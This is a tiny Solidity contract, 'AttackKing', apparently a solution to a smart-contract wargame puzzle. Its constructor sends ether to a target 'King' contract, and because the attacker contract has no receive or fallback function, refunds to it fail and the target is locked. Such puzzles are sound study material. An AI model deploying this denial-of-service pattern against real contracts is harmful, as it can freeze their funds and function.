// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackKing {
    
    constructor(address payable contractKing) payable{

        (bool success, ) = contractKing.call{value:msg.value}("");
        require(success, "Failure");
    }
 
}
